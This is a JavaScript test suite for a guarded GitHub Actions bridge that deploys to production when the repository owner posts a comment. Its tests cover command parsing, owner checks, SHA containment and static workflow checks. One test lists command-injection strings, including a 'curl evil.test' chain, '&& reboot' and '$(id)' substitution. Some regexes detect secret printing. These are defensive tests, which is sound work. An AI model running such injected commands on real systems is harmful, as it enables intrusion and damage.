/**
 * Issue #234 — guarded owner-comment production deploy bridge.
 *
 * Deterministic parser/auth/static workflow checks. Never deploys and never
 * contacts Cloudflare / production providers.
 */
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import {
  DEPLOY_CONTROL_PLANE_ISSUE,
  authorizeDeployBridge,
  evaluateDeployBridge,
  main as bridgeMain,
  parseDeployProductionCommand,
  verifyShaContainedInRef,
} from "../../../.github/scripts/deploy-production-bridge.mjs";

const APP_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const REPO_ROOT = path.resolve(APP_ROOT, "..");
const BRIDGE_SCRIPT = path.join(REPO_ROOT, ".github/scripts/deploy-production-bridge.mjs");
const BRIDGE_WORKFLOW = path.join(
  REPO_ROOT,
  ".github/workflows/deploy-production-comment-bridge.yml",
);
const DEPLOY_WORKFLOW = path.join(REPO_ROOT, ".github/workflows/deploy-production.yml");

const VALID_SHA = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const VALID_SHA_UPPER = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
const VALID_COMMAND = `/deploy-production ${VALID_SHA}`;

function ownerCtx(overrides = {}) {
  return {
    action: "created",
    issueNumber: DEPLOY_CONTROL_PLANE_ISSUE,
    issueIsPullRequest: false,
    actorLogin: "daveybehavey",
    commentUserLogin: "daveybehavey",
    repositoryOwner: "daveybehavey",
    commentBody: VALID_COMMAND,
    ...overrides,
  };
}

function read(filePath) {
  return fs.readFileSync(filePath, "utf8");
}

function stripYamlCommentsAndQuotes(yaml) {
  return yaml
    .split("\n")
    .map((line) => line.replace(/^\s*#.*/, ""))
    .join("\n");
}

// ---------------------------------------------------------------------------
// Parser: exact grammar
// ---------------------------------------------------------------------------

test("exact valid owner command is accepted (lowercase SHA)", () => {
  const parsed = parseDeployProductionCommand(VALID_COMMAND);
  assert.equal(parsed.ok, true);
  assert.equal(parsed.sha, VALID_SHA);
});

test("exact valid command accepts uppercase hex SHA", () => {
  const parsed = parseDeployProductionCommand(`/deploy-production ${VALID_SHA_UPPER}`);
  assert.equal(parsed.ok, true);
  assert.equal(parsed.sha, VALID_SHA_UPPER);
});

test("evaluate accepts authorized exact owner command", () => {
  const decision = evaluateDeployBridge(ownerCtx());
  assert.equal(decision.decision, "accept");
  assert.equal(decision.sha, VALID_SHA);
});

test("partial SHA is rejected", () => {
  const shortSha = "a".repeat(39);
  const parsed = parseDeployProductionCommand(`/deploy-production ${shortSha}`);
  assert.equal(parsed.ok, false);
  assert.equal(parsed.code, "malformed");
});

test("41-char SHA is rejected", () => {
  const parsed = parseDeployProductionCommand(`/deploy-production ${"a".repeat(41)}`);
  assert.equal(parsed.ok, false);
});

test("extra args are rejected", () => {
  const parsed = parseDeployProductionCommand(`${VALID_COMMAND} extra`);
  assert.equal(parsed.ok, false);
  assert.equal(parsed.code, "malformed");
});

test("leading/trailing whitespace payload is rejected", () => {
  assert.equal(parseDeployProductionCommand(` ${VALID_COMMAND}`).ok, false);
  assert.equal(parseDeployProductionCommand(`${VALID_COMMAND} `).ok, false);
  assert.equal(parseDeployProductionCommand(`\t${VALID_COMMAND}`).ok, false);
});

test("multiline payload is rejected", () => {
  assert.equal(parseDeployProductionCommand(`${VALID_COMMAND}\n`).ok, false);
  assert.equal(parseDeployProductionCommand(`${VALID_COMMAND}\r\n`).ok, false);
  assert.equal(
    parseDeployProductionCommand(`${VALID_COMMAND}\n/deploy-production ${VALID_SHA}`).ok,
    false,
  );
});

test("branch and tag names are rejected", () => {
  assert.equal(parseDeployProductionCommand("/deploy-production main").ok, false);
  assert.equal(parseDeployProductionCommand("/deploy-production origin/main").ok, false);
  assert.equal(parseDeployProductionCommand("/deploy-production v1.2.3").ok, false);
  assert.equal(parseDeployProductionCommand("/deploy-production refs/heads/main").ok, false);
});

test("shell metacharacter / comment-injection attempts are rejected", () => {
  const injections = [
    `/deploy-production ${VALID_SHA}; curl evil.test`,
    `/deploy-production ${VALID_SHA} && reboot`,
    `/deploy-production ${VALID_SHA}$(id)`,
    `/deploy-production ${VALID_SHA}\`id\``,
    `/deploy-production ${VALID_SHA}|tee /tmp/x`,
    `/deploy-production ${VALID_SHA}\nexport EVIL=1`,
    `/deploy-production ${"a".repeat(39)};${"b"}`,
    `/deploy-production ${VALID_SHA} # comment`,
    `;/deploy-production ${VALID_SHA}`,
    `$(/deploy-production ${VALID_SHA})`,
  ];
  for (const body of injections) {
    const parsed = parseDeployProductionCommand(body);
    assert.equal(parsed.ok, false, `expected reject for ${JSON.stringify(body)}`);
  }
});

test("non-command comments are classified as not_command", () => {
  const parsed = parseDeployProductionCommand("please deploy main");
  assert.equal(parsed.ok, false);
  assert.equal(parsed.code, "not_command");
});

// ---------------------------------------------------------------------------
// Authorization gates
// ---------------------------------------------------------------------------

test("wrong issue is rejected for deploy-shaped commands", () => {
  const decision = evaluateDeployBridge(ownerCtx({ issueNumber: 212 }));
  assert.equal(decision.decision, "reject");
  assert.match(decision.reason, /#213/);
});

test("non-owner actor is rejected", () => {
  const decision = evaluateDeployBridge(ownerCtx({ actorLogin: "someone-else" }));
  assert.equal(decision.decision, "reject");
  assert.match(decision.reason, /actor must be the repository owner/);
});

test("non-owner comment user is rejected even if actor matches", () => {
  const decision = evaluateDeployBridge(ownerCtx({ commentUserLogin: "bot-user" }));
  assert.equal(decision.decision, "reject");
  assert.match(decision.reason, /comment user must be the repository owner/);
});

test("edited/deleted comment actions cannot authorize deploy", () => {
  for (const action of ["edited", "deleted", "created_at", ""]) {
    const auth = authorizeDeployBridge(ownerCtx({ action }));
    assert.equal(auth.ok, false, `action ${action} must fail closed`);
    assert.equal(auth.code, "bad_action");
    const decision = evaluateDeployBridge(ownerCtx({ action }));
    assert.equal(decision.decision, "reject");
  }
});

test("pull request comments cannot authorize deploy", () => {
  const decision = evaluateDeployBridge(ownerCtx({ issueIsPullRequest: true }));
  assert.equal(decision.decision, "reject");
  assert.match(decision.reason, /pull request/i);
});

test("unrelated comments on #213 are ignored (no deploy, no failure)", () => {
  const decision = evaluateDeployBridge(ownerCtx({ commentBody: "tracking release notes" }));
  assert.equal(decision.decision, "ignore");
});

test("owner comparison is case-insensitive for GitHub logins", () => {
  const decision = evaluateDeployBridge(
    ownerCtx({
      actorLogin: "DaveyBehavey",
      commentUserLogin: "DAVEYBEHAVEY",
      repositoryOwner: "daveybehavey",
    }),
  );
  assert.equal(decision.decision, "accept");
});

// ---------------------------------------------------------------------------
// Main containment
// ---------------------------------------------------------------------------

test("SHA not on main is rejected by containment check", () => {
  const result = verifyShaContainedInRef({
    sha: VALID_SHA,
    ref: "origin/main",
    run(argv) {
      if (argv[1] === "cat-file") {
        return { status: 0, stdout: "commit\n", stderr: "" };
      }
      if (argv[1] === "merge-base") {
        return { status: 1, stdout: "", stderr: "" };
      }
      return { status: 1, stdout: "", stderr: "unexpected" };
    },
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /not contained in origin\/main/);
});

test("non-commit git object is rejected by containment check", () => {
  const result = verifyShaContainedInRef({
    sha: VALID_SHA,
    run() {
      return { status: 0, stdout: "blob\n", stderr: "" };
    },
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /must resolve to a commit/);
});

test("containment check uses argv arrays (no shell interpolation)", () => {
  /** @type {string[][]} */
  const calls = [];
  const result = verifyShaContainedInRef({
    sha: VALID_SHA,
    ref: "origin/main",
    run(argv) {
      calls.push(argv);
      if (argv[1] === "cat-file") return { status: 0, stdout: "commit\n", stderr: "" };
      return { status: 0, stdout: "", stderr: "" };
    },
  });
  assert.equal(result.ok, true);
  assert.deepEqual(calls[0], ["git", "cat-file", "-t", VALID_SHA]);
  assert.deepEqual(calls[1], ["git", "merge-base", "--is-ancestor", VALID_SHA, "origin/main"]);
});

test("temp git repo: ancestor on main accepted; divergent SHA rejected", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "deploy-bridge-git-"));
  const run = (args) =>
    spawnSync("git", args, { cwd: tmp, encoding: "utf8", env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });

  assert.equal(run(["init", "-b", "main"]).status, 0);
  fs.writeFileSync(path.join(tmp, "a.txt"), "a");
  assert.equal(run(["add", "a.txt"]).status, 0);
  assert.equal(run(["commit", "-m", "a"]).status, 0);
  const mainSha = run(["rev-parse", "HEAD"]).stdout.trim();
  assert.match(mainSha, /^[0-9a-f]{40}$/);

  // Divergent commit not on main.
  assert.equal(run(["checkout", "-b", "other"]).status, 0);
  fs.writeFileSync(path.join(tmp, "b.txt"), "b");
  assert.equal(run(["add", "b.txt"]).status, 0);
  assert.equal(run(["commit", "-m", "b"]).status, 0);
  const otherSha = run(["rev-parse", "HEAD"]).stdout.trim();
  assert.equal(run(["checkout", "main"]).status, 0);

  const ok = verifyShaContainedInRef({ sha: mainSha, ref: "main", cwd: tmp });
  assert.equal(ok.ok, true);

  const bad = verifyShaContainedInRef({ sha: otherSha, ref: "main", cwd: tmp });
  assert.equal(bad.ok, false);
  assert.match(bad.reason, /not contained/);

  fs.rmSync(tmp, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// CLI env channel (never shell-source)
// ---------------------------------------------------------------------------

test("CLI accepts via COMMENT_BODY env and writes GITHUB_OUTPUT", () => {
  const out = path.join(os.tmpdir(), `gh-out-${Date.now()}.txt`);
  const code = bridgeMain({
    COMMENT_BODY: VALID_COMMAND,
    BRIDGE_COMMENT_ACTION: "created",
    BRIDGE_ISSUE_NUMBER: String(DEPLOY_CONTROL_PLANE_ISSUE),
    BRIDGE_ISSUE_IS_PULL_REQUEST: "false",
    BRIDGE_ACTOR_LOGIN: "owner",
    BRIDGE_COMMENT_USER_LOGIN: "owner",
    BRIDGE_REPOSITORY_OWNER: "owner",
    GITHUB_OUTPUT: out,
  });
  assert.equal(code, 0);
  const written = read(out);
  assert.match(written, new RegExp(`sha<<`));
  assert.match(written, new RegExp(VALID_SHA));
  assert.match(written, /should_deploy<<[\s\S]*true/);
  fs.unlinkSync(out);
});

test("CLI rejects non-owner deploy attempts with exit 1", () => {
  const code = bridgeMain({
    COMMENT_BODY: VALID_COMMAND,
    BRIDGE_COMMENT_ACTION: "created",
    BRIDGE_ISSUE_NUMBER: "213",
    BRIDGE_ISSUE_IS_PULL_REQUEST: "false",
    BRIDGE_ACTOR_LOGIN: "attacker",
    BRIDGE_COMMENT_USER_LOGIN: "attacker",
    BRIDGE_REPOSITORY_OWNER: "owner",
  });
  assert.equal(code, 1);
});

test("CLI ignores unrelated comments with exit 0", () => {
  const code = bridgeMain({
    COMMENT_BODY: "lgtm",
    BRIDGE_COMMENT_ACTION: "created",
    BRIDGE_ISSUE_NUMBER: "213",
    BRIDGE_ISSUE_IS_PULL_REQUEST: "false",
    BRIDGE_ACTOR_LOGIN: "owner",
    BRIDGE_COMMENT_USER_LOGIN: "owner",
    BRIDGE_REPOSITORY_OWNER: "owner",
  });
  assert.equal(code, 0);
});

test("CLI script is executable via node argv (smoke)", () => {
  const result = spawnSync(process.execPath, [BRIDGE_SCRIPT], {
    encoding: "utf8",
    env: {
      ...process.env,
      COMMENT_BODY: "hello",
      BRIDGE_COMMENT_ACTION: "created",
      BRIDGE_ISSUE_NUMBER: "213",
      BRIDGE_ISSUE_IS_PULL_REQUEST: "false",
      BRIDGE_ACTOR_LOGIN: "owner",
      BRIDGE_COMMENT_USER_LOGIN: "owner",
      BRIDGE_REPOSITORY_OWNER: "owner",
    },
  });
  assert.equal(result.status, 0, result.stderr);
});

// ---------------------------------------------------------------------------
// Static workflow validation
// ---------------------------------------------------------------------------

test("bridge workflow triggers only on issue_comment created", () => {
  const yaml = read(BRIDGE_WORKFLOW);
  assert.match(yaml, /on:\s*\n\s*issue_comment:\s*\n\s*types:\s*\[created\]/);
  assert.doesNotMatch(yaml, /pull_request_target/);
  assert.doesNotMatch(yaml, /^\s*push:\s*$/m);
  assert.doesNotMatch(yaml, /^\s*schedule:\s*$/m);
  assert.doesNotMatch(yaml, /types:\s*\[[^\]]*edited/);
  assert.doesNotMatch(yaml, /types:\s*\[[^\]]*deleted/);
});

test("bridge workflow fail-closed gates: issue 213, owner env, COMMENT_BODY env", () => {
  const yaml = read(BRIDGE_WORKFLOW);
  assert.match(yaml, /github\.event\.issue\.number == 213/);
  assert.match(yaml, /github\.event\.action == 'created'/);
  assert.match(yaml, /github\.event\.issue\.pull_request == null/);
  assert.match(yaml, /COMMENT_BODY:\s*\$\{\{\s*github\.event\.comment\.body\s*\}\}/);
  assert.match(yaml, /BRIDGE_ACTOR_LOGIN:\s*\$\{\{\s*github\.actor\s*\}\}/);
  assert.match(yaml, /BRIDGE_COMMENT_USER_LOGIN:\s*\$\{\{\s*github\.event\.comment\.user\.login\s*\}\}/);
  assert.match(yaml, /BRIDGE_REPOSITORY_OWNER:\s*\$\{\{\s*github\.repository_owner\s*\}\}/);
  assert.match(yaml, /BRIDGE_VERIFY_MAIN:\s*"1"/);
  assert.match(yaml, /permissions:\s*\n\s*contents:\s*read/);
  // No top-level write grants on the bridge workflow.
  assert.doesNotMatch(yaml, /contents:\s*write/);
  assert.doesNotMatch(yaml, /pull-requests:\s*write/);
  assert.doesNotMatch(yaml, /issues:\s*write/);
  assert.doesNotMatch(yaml, /actions:\s*write/);
});

test("bridge never interpolates raw comment into a shell script string", () => {
  const yaml = read(BRIDGE_WORKFLOW);
  const lines = yaml.split("\n");
  for (const line of lines) {
    const trimmed = line.trim();
    if (trimmed.startsWith("#")) continue;
    // Comment body may appear in env: mappings only — never on a run: line.
    if (/run:/.test(trimmed)) {
      assert.doesNotMatch(
        trimmed,
        /github\.event\.comment\.body/,
        `run line must not interpolate comment body: ${trimmed}`,
      );
    }
  }
  assert.match(yaml, /env:\s*\n(?:\s*#[^\n]*\n)*\s*COMMENT_BODY:\s*\$\{\{\s*github\.event\.comment\.body\s*\}\}/);
  assert.match(yaml, /run:\s*node \.github\/scripts\/deploy-production-bridge\.mjs/);
});

test("bridge calls reusable deploy-production workflow with validated SHA only", () => {
  const yaml = stripYamlCommentsAndQuotes(read(BRIDGE_WORKFLOW));
  assert.match(yaml, /uses:\s*\.\/\.github\/workflows\/deploy-production\.yml/);
  assert.match(yaml, /ref:\s*\$\{\{\s*needs\.validate\.outputs\.sha\s*\}\}/);
  assert.match(yaml, /secrets:\s*inherit/);
  assert.match(yaml, /should_deploy == 'true'/);
  assert.doesNotMatch(yaml, /qa:live-print-conversion/);
  assert.doesNotMatch(yaml, /auto-?merge/i);
});

test("deploy-production retains workflow_dispatch and gains workflow_call with shared inputs.ref", () => {
  const yaml = stripYamlCommentsAndQuotes(read(DEPLOY_WORKFLOW));
  assert.match(yaml, /workflow_dispatch:/);
  assert.match(yaml, /workflow_call:/);
  const dispatchIdx = yaml.indexOf("workflow_dispatch:");
  const callIdx = yaml.indexOf("workflow_call:");
  assert.ok(dispatchIdx >= 0 && callIdx >= 0);
  const dispatchBlock = yaml.slice(dispatchIdx, callIdx);
  const callBlock = yaml.slice(callIdx, yaml.indexOf("concurrency:"));
  assert.match(dispatchBlock, /^\s*ref:/m);
  assert.match(callBlock, /^\s*ref:/m);
  assert.match(yaml, /ref:\s*\$\{\{\s*inputs\.ref\s*\}\}/);
});

test("reusable deploy workflow still runs checkout → npm ci → unit → Cloudflare → qa:live-critical only", () => {
  const yaml = read(DEPLOY_WORKFLOW);
  const stepOrder = [
    /uses:\s*actions\/checkout@v4/,
    /run:\s*npm ci/,
    /run:\s*npm run test:unit/,
    /run:\s*npm run deploy:inner/,
    /run:\s*npm run qa:live-critical/,
  ];
  let cursor = 0;
  for (const re of stepOrder) {
    const idx = yaml.slice(cursor).search(re);
    assert.ok(idx >= 0, `missing step ${re}`);
    cursor += idx + 1;
  }
  assert.match(yaml, /concurrency:\s*\n\s*group:\s*deploy-production/);
  assert.match(yaml, /cancel-in-progress:\s*false/);
  assert.doesNotMatch(yaml, /qa:live-print-conversion/);
  assert.doesNotMatch(yaml, /pull_request_target/);
  assert.doesNotMatch(yaml, /^\s*push:\s*$/m);
  assert.doesNotMatch(yaml, /^\s*schedule:\s*$/m);
});

test("deploy-production Cloudflare step wires token + legacy auth without printing secrets", () => {
  const yaml = read(DEPLOY_WORKFLOW);
  const deployStepMatch = yaml.match(
    /- name:\s*Deploy to Cloudflare\n([\s\S]*?)(?=\n\s*- name:|\n*$)/,
  );
  assert.ok(deployStepMatch, "Deploy to Cloudflare step must exist");
  const deployStep = deployStepMatch[1];

  assert.match(
    deployStep,
    /CLOUDFLARE_API_TOKEN:\s*\$\{\{\s*secrets\.CLOUDFLARE_API_TOKEN\s*\}\}/,
  );
  assert.match(
    deployStep,
    /CLOUDFLARE_API_KEY:\s*\$\{\{\s*secrets\.CLOUDFLARE_API_KEY\s*\}\}/,
  );
  assert.match(
    deployStep,
    /CLOUDFLARE_EMAIL:\s*\$\{\{\s*secrets\.CLOUDFLARE_EMAIL\s*\}\}/,
  );
  assert.match(deployStep, /run:\s*npm run deploy:inner/);

  // Secret values must never appear as literals; only GitHub secrets expressions.
  assert.doesNotMatch(yaml, /CLOUDFLARE_API_TOKEN:\s*(?!\$\{\{\s*secrets\.CLOUDFLARE_API_TOKEN\s*\}\})\S+/);
  assert.doesNotMatch(yaml, /CLOUDFLARE_API_KEY:\s*(?!\$\{\{\s*secrets\.CLOUDFLARE_API_KEY\s*\}\})\S+/);
  assert.doesNotMatch(yaml, /CLOUDFLARE_EMAIL:\s*(?!\$\{\{\s*secrets\.CLOUDFLARE_EMAIL\s*\}\})\S+/);
  assert.doesNotMatch(yaml, /echo\s+.*CLOUDFLARE_API_(TOKEN|KEY)|printenv\s+CLOUDFLARE_API_(TOKEN|KEY)/i);

  assert.match(yaml, /run:\s*npm run qa:live-critical/);
  assert.doesNotMatch(yaml, /qa:live-print-conversion/);
});

test("no workflow in .github introduces qa:live-print-conversion deploy path", () => {
  const workflowsDir = path.join(REPO_ROOT, ".github/workflows");
  for (const name of fs.readdirSync(workflowsDir)) {
    if (!name.endsWith(".yml") && !name.endsWith(".yaml")) continue;
    const src = read(path.join(workflowsDir, name));
    assert.doesNotMatch(
      src,
      /qa:live-print-conversion/,
      `${name} must not invoke qa:live-print-conversion`,
    );
  }
});

test("bridge and deploy workflows do not use pull_request_target", () => {
  assert.doesNotMatch(read(BRIDGE_WORKFLOW), /pull_request_target/);
  assert.doesNotMatch(read(DEPLOY_WORKFLOW), /pull_request_target/);
});
